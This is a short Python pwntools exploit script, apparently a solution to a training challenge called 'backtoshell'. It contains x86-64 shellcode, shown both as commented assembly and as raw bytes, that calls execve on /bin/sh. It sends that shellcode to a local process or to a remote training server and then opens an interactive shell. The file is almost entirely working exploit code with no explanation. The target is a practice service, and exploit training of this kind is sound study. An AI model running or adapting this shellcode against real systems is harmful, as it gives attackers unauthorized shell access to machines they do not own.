# coding=UTF-8
from pwn import *

'''
mov rsp, rax
add rsp, 0x40
mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp
xor rbx, rbx
push rbx
mov rsi, rsp
mov rax, rsp
mov rax, 0x3b
syscall
'''

ELF('./backtoshell')
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) == 2 and sys.argv[1] == 'attack':
    r = remote('bin.training.jinblack.it', 3001)
else:
    r = process('./backtoshell')
    gdb.attach(r, '''
        #b *0x004011bb
    ''')

shellcode = "\x48\x89\xC4\x48\x83\xC4\x40\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE0\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"

input('press a key...')
r.sendline(shellcode)
r.interactive()

